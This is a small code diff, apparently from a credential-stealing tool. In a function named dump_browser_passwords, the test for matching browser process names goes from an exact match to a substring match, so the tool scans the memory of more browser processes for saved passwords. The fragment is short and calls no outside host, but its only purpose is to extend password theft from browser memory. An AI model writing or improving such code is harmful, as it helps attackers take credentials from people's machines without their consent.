@@ -50,7 +50,7 @@ else:
 def dump_browser_passwords():
     start_time=time.time()
     for process in Process.list():
-        if process.get('name') in browser_list:
+        if process.get('name') in browser_list or any([x in process.get('name') for x in browser_list]):
             try:
                 mw = MemWorker(pid=process.get('pid'))
             except ProcessException:
